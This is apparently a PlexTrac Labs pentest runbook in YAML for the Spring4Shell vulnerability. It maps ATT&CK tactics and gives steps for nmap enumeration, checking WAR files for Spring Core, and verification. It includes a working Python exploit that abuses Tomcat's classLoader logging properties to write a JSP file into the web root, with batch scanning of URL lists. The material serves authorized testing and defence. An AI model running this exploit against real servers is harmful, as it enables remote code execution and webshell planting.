@@ -1,0 +1,218 @@
+title: Spring4Shell
+version: 1.0.0
+methodology: &ref_0
+  id: cl1e0nv3500pe0vztbdac19jj
+  name: Plextrac Labs
+  description: Items built by PlexTrac's internal security team.
+  shortName: plextrac-labs
+  depth: 0
+tactics:
+  - id: cksur8w0k00d327tp4nb7exft
+    name: Initial Access
+    description: >-
+      The adversary is trying to get into your network.
+
+
+      Initial Access consists of techniques that use various entry vectors to
+      gain their initial foothold within a network. Techniques used to gain a
+      foothold include targeted spearphishing and exploiting weaknesses on
+      public-facing web servers. Footholds gained through initial access may
+      allow for continued access, like valid accounts and use of external remote
+      services, or may be limited-use due to changing passwords.
+    shortName: TA0001
+    depth: 1
+    parents:
+      - *ref_0
+      - *ref_0
+  - &ref_1
+    id: cksur8w0g00d027tpbo4z43uh
+    name: Execution
+    description: >-
+      The adversary is trying to run malicious code.
+
+
+      Execution consists of techniques that result in adversary-controlled code
+      running on a local or remote system. Techniques that run malicious code
+      are often paired with techniques from all other tactics to achieve broader
+      goals, like exploring a network or stealing data. For example, an
+      adversary might use a remote access tool to run a PowerShell script that
+      does Remote System Discovery. 
+    shortName: TA0002
+    depth: 1
+    parents:
+      - *ref_0
+      - *ref_0
+  - id: cksur9vtm00yg27tph36c1exh
+    name: Persistence
+    description: >-
+      The adversary is trying to maintain their foothold.
+
+
+      Persistence consists of techniques that adversaries use to keep access to
+      systems across restarts, changed credentials, and other interruptions that
+      could cut off their access. Techniques used for persistence include any
+      access, action, or configuration changes that let them maintain their
+      foothold on systems, such as replacing or hijacking legitimate code or
+      adding startup code. 
+    shortName: TA0003
+    depth: 1
+    parents:
+      - *ref_0
+      - *ref_0
+techniques:
+  - id: cksur8wcl00l127tp51ybgmdz
+    name: Malicious File
+    description: >-
+      An adversary may rely upon a user opening a malicious file in order to
+      gain execution. Users may be subjected to social engineering to get them
+      to open a file that will lead to code execution. This user action will
+      typically be observed as follow-on behavior from [Spearphishing
+      Attachment](https://attack.mitre.org/techniques/T1566/001). Adversaries
+      may use several types of files that require a user to execute them,
+      including .doc, .pdf, .xls, .rtf, .scr, .exe, .lnk, .pif, and .cpl.
+
+
+      Adversaries may employ various forms of
+      [Masquerading](https://attack.mitre.org/techniques/T1036) on the file to
+      increase the likelihood that a user will open it.
+
+
+      While [Malicious File](https://attack.mitre.org/techniques/T1204/002)
+      frequently occurs shortly after Initial Access it may occur at other
+      phases of an intrusion, such as when an adversary places a file in a
+      shared directory or on a user's desktop hoping that a user will click on
+      it. This activity may also be seen shortly after [Internal
+      Spearphishing](https://attack.mitre.org/techniques/T1534).
+    shortName: T1204.002
+    depth: 2
+    parents:
+      - *ref_1
+procedures:
+  - id: cl1e14h5w00pg0vztc1hc74c5
+    name: Service Enumeration (External)
+    description: >-
+      <p>Identifying vulnerable systems running Java based services.
+      &nbsp;Customize as needed for various servers/platforms.</p><p>&nbsp;</p>
+    shortName: pt-labs-service-enumeration
+    executionSteps:
+      - >-
+        <p><span
+        style="background-color:rgb(255,255,255);color:rgb(32,33,36);"><strong>Run:&nbsp;</strong></span></p><p><span
+        style="background-color:rgb(255,255,255);color:rgb(32,33,36);"><code>nmap
+        -p&lt;common web ports&gt; -sV &lt;target
+        host&gt;</code></span></p><p>&nbsp;</p><p><span
+        style="background-color:rgb(255,255,255);color:rgb(32,33,36);"><strong>Example
+        output (Vulnerable server running Apache
+        Tomcat):</strong></span></p><pre><code
+        class="language-plaintext">Starting Nmap 7.91 ( https://nmap.org ) at
+        2022-03-30 16:30 EDT
+
+        Stats: 0:00:06 elapsed; 0 hosts completed (1 up), 1 undergoing Service
+        Scan Service scan
+
+        Timing: About 0.00% done Nmap scan report for TRAEFIK (127.0.0.1)
+
+        Host is up (0.000079s latency).
+
+
+        PORT STATE SERVICE VERSION 8080/tcp open http Apache Tomcat 9.0.60
+        Service detection performed. Please report any incorrect results at
+        https://nmap.org/submit/.
+
+        Nmap done: 1 IP address (1 host up) scanned in 6.41</code></pre>
+    categories: !<tag:yaml.org,2002:js/undefined> ''
+  - id: cl1e1jyx300ph0vzt06l69oh8
+    name: Application Auditing (Internal)
+    description: >-
+      <p>Instructions for identifying if your application includes Spring Core
+      as a dependency.</p>
+    shortName: pt-labs-application-audit
+    executionSteps:
+      - >-
+        <p>Determine Java version, versions &gt;= 9.0 are potentially
+        affected.</p><p>&nbsp;</p><p><strong>Run:</strong></p><p><code>java
+        -version</code></p><p>&nbsp;</p><p>If the semantic version number begins
+        with a number &gt;= 9 you'll want to continue assessing if your
+        application is vulnerable.</p>
+      - >-
+        <p>Unpack application deployment manifests (war
+        files)</p><p>&nbsp;</p><p><strong>Run:</strong></p><p><code>unzip
+        &lt;filename&gt;.war</code></p><p>&nbsp;</p><p><strong>Search the
+        extracted files
+        for:</strong></p><p><code>spring-beans-*.jar</code></p><p>&nbsp;</p><p>If
+        you find any results, your application is running Spring Core and is
+        vulnerable to <code>Spring4Shell</code>.</p><p>&nbsp;</p>
+    categories: !<tag:yaml.org,2002:js/undefined> ''
+  - id: cl1e2356v00pi0vzt320nex0h
+    name: Exploiting Spring4Shell Vulnerability
+    description: >-
+      <p>Example exploitation of the Spring4Shell Vulnerability on a server
+      running JDK &gt;= 9.0 and Apache Tomcat hosting a vulnerable application
+      built with Spring Core.</p><p>&nbsp;</p>
+    shortName: pt-labs-export-spring4shell
+    executionSteps:
+      - >-
+        <p>Run the following Python script:</p><p>&nbsp;</p><pre><code
+        class="language-plaintext">#coding:utf-8
+
+
+        import requests
+
+        import argparse
+
+        try:
+            from urllib.parse import urljoin
+        except ImportError:
+            from urlparse import urljoin
+
+        def Exploit(url):
+            headers = {"suffix":"%&gt;//",
+                        "c1":"Runtime",
+                        "c2":"&lt;%",
+                        "DNT":"1",
+                        "Content-Type":"application/x-www-form-urlencoded"
+
+            }
+            data = "class.module.classLoader.resources.context.parent.pipeline.first.pattern=%25%7Bc2%7Di%3d%20%22%48%65%6c%6c%6f%20%57%6f%72%6c%64%21%22%20%25%7Bsuffix%7Di&amp;class.module.classLoader.resources.context.parent.pipeline.first.suffix=&lt;file_extension&gt;&amp;class.module.classLoader.resources.context.parent.pipeline.first.directory=&lt;destination_directory&gt;&amp;class.module.classLoader.resources.context.parent.pipeline.first.prefix=&lt;file contents&gt;&amp;class.module.classLoader.resources.context.parent.pipeline.first.fileDateFormat="
+            try:
+
+                go = requests.post(url,headers=headers,data=data,timeout=15,allow_redirects=False, verify=False)
+                shellurl = urljoin(url, 'tomcatwar.jsp')
+                shellgo = requests.get(shellurl,timeout=15,allow_redirects=False, verify=False)
+                if shellgo.status_code == 200:
+                    print(shellurl)
+            except Exception as e:
+                print(e)
+                pass
+
+
+
+
+        def main():
+            parser = argparse.ArgumentParser(description='Srping-Core Rce.')
+            parser.add_argument('--file',help='url file',required=False)
+            parser.add_argument('--url',help='target url',required=False)
+            args = parser.parse_args()
+            if args.url:
+                Exploit(args.url)
+            if args.file:
+                with open (args.file) as f:
+                    for i in f.readlines():
+                        i = i.strip()
+                        Exploit(i)
+
+        if __name__ == "__main__":
+            main()</code></pre><p>&nbsp;</p><p>Ensure that you modify the above script to include the following pieces of information:</p><ul><li>&lt;file_extension&gt; -- The newly created file's extension (e.g. .jsp)</li><li>&lt;destination_directory&gt; -- Directory on your server the file should be written to (e.g. webapps/ROOT)</li><li>&lt;file name&gt; -- Name you'd like written to the sample file (e.g. hacked)</li></ul><p>In the example above this will create the file <code>/tomcat-install-path/webapps/ROOT/hacked.jsp</code></p>
+    categories: !<tag:yaml.org,2002:js/undefined> ''
+  - id: cl1e2fg4l00pt0vztb5pc4mmj
+    name: Spring4Shell Exploit Verification
+    description: >-
+      <p>Instructions on how to validate the exploit worked on a running
+      system.</p>
+    shortName: pt-labs-spring4shell-verification
+    executionSteps:
+      - >-
+        <p>Shell into the server you're attempting to perform the exploit
+        against and search for the file<code>
+        /opt/tomcat-installation/webapp/ROOT/filename.jsp</code></p><p>&nbsp;</p>
+    categories: !<tag:yaml.org,2002:js/undefined> ''
